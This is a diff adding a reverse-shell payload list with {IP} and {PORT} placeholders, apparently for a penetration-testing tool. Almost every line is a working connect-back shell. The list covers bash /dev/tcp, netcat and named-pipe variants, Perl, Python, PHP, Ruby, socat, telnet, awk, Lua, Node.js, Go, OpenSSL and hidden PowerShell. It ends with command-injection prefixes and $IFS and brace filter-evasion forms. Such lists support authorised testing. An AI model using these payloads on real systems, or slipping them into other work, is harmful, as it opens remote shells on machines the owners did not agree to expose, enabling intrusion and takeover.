@@ -1,0 +1,115 @@
+# Reverse-shell payloads. Placeholders: {IP} {PORT} (optional {SHELL})
+# A connect-back shell is the canonical proof of OS command execution.
+# Inspired by PayloadsAllTheThings, SecLists, HackTricks and revshells.com.
+# One payload per line; blank lines and lines starting with '#' are ignored.
+
+# --- Bash /dev/tcp (no external binary needed) ---
+bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
+bash -i 5<> /dev/tcp/{IP}/{PORT} 0<&5 1>&5 2>&5
+0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done
+exec /bin/sh 0</dev/tcp/{IP}/{PORT} 1>&0 2>&0
+/bin/bash -l > /dev/tcp/{IP}/{PORT} 0<&1 2>&1
+bash -i >& /dev/udp/{IP}/{PORT} 0>&1
+
+# --- POSIX sh ---
+sh -i >& /dev/tcp/{IP}/{PORT} 0>&1
+/bin/sh -i >& /dev/tcp/{IP}/{PORT} 0>&1
+
+# --- zsh ---
+zsh -c 'zmodload zsh/net/tcp && ztcp {IP} {PORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+# --- netcat (various builds) ---
+nc {IP} {PORT} -e /bin/sh
+nc {IP} {PORT} -e /bin/bash
+nc -e /bin/sh {IP} {PORT}
+nc -e /bin/bash {IP} {PORT}
+nc -c /bin/sh {IP} {PORT}
+nc.traditional -e /bin/bash {IP} {PORT}
+ncat {IP} {PORT} -e /bin/bash
+ncat --udp {IP} {PORT} -e /bin/bash
+ncat --ssl {IP} {PORT} -e /bin/bash
+rlwrap nc {IP} {PORT} -e /bin/bash
+# netcat without -e (OpenBSD / busybox) via a named pipe
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f
+mknod /tmp/backpipe p && nc {IP} {PORT} 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
+mkfifo /tmp/lhennp; nc {IP} {PORT} 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp
+busybox nc {IP} {PORT} -e /bin/sh
+
+# --- Perl ---
+perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{IP}:{PORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# --- Python ---
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("{IP}",{PORT}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+export RHOST="{IP}";export RPORT={PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+# --- PHP ---
+php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{IP}",{PORT});`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("{IP}",{PORT});popen("/bin/sh -i <&3 >&3 2>&3","r");'
+
+# --- Ruby ---
+ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{IP}",{PORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# --- socat ---
+socat TCP:{IP}:{PORT} EXEC:/bin/sh
+socat TCP:{IP}:{PORT} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
+socat tcp-connect:{IP}:{PORT} exec:"bash -li",pty,stderr,setsid,sigint,sane
+socat OPENSSL:{IP}:{PORT},verify=0 EXEC:/bin/bash
+
+# --- telnet ---
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {IP} {PORT} >/tmp/f
+telnet {IP} {PORT} | /bin/sh | telnet {IP} {PORT}
+
+# --- awk ---
+awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+# --- Lua ---
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+lua5.1 -e 'local s=require("socket");local t=assert(s.tcp());t:connect("{IP}",{PORT});os.execute("/bin/sh -i <&3 >&3 2>&3")'
+
+# --- Node.js ---
+node -e 'require("child_process").exec("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f")'
+nodejs -e 'require("child_process").exec("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f")'
+
+# --- Go ---
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+
+# --- OpenSSL (encrypted channel) ---
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s
+
+# --- PowerShell (Windows targets) ---
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamReader = New-Object IO.StreamReader($NetworkStream);$StreamWriter = New-Object IO.StreamWriter($NetworkStream);$StreamWriter.AutoFlush = $true;$Buffer = New-Object System.Byte[] 1024;while ($TCPClient.Connected) {while ($NetworkStream.DataAvailable) {$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)};if ($TCPClient.Connected -and $Code.Length -gt 1) {$Output = try {Invoke-Expression ($Code) 2>&1} catch {$_};$StreamWriter.Write(\"$Output`n\");$Code = $null}};$TCPClient.Close()"
+
+# ============================================================
+# injection context -- prefix a canonical bash connect-back
+# ============================================================
+; bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+& bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+&& bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+| bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+|| bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
+`bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'`
+$(bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1')
+%0abash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
+%0d%0abash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
+'; bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 ; '
+"; bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 ; "
+' && bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 && '
+
+# ============================================================
+# space / $IFS bypass of the connect-back
+# ============================================================
+bash${IFS}-c${IFS}'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'
+{bash,-c,'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'}
